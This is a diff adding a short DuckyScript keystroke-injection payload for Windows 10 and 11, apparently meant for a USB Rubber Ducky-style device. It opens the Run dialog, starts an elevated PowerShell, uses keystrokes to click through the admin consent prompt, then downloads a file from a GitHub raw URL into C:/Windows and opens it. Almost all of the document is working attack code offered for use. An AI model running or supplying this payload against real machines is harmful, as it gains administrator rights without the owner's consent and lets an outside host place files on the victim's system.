@@ -1,0 +1,26 @@
+REM Est. Execution Time:xxx ms 
+REM Character Count: 	368
+REM Author: 		ZilXen
+REM Description: 		The script opens an PowerShell window and downloading and opening a file from a URL on a
+REM Description: 			Windows system.
+REM Version: 		1.0
+REM Category: 		CopySelfwriting
+REM Target: 		Windows 10,11
+DELAY 1000
+WINDOWS d
+DELAY 1000
+WINDOWS r
+DELAY 700
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 500
+LEFTARROW
+DELAY 3000
+ENTER
+DELAY 700
+STRING Invoke-WebRequest -Uri https://raw.githubusercontent.com/UNC0V3R3D/ressources/main/happyBDAY.txt -OutFile C:/Windows/6565.txt; Start-Process -FilePath "C:/windows/6565.txt" -WindowStyle maximized
+ENTER
+DELAY 800
+CTRL 0
+CTRL -
+REPEAT 3
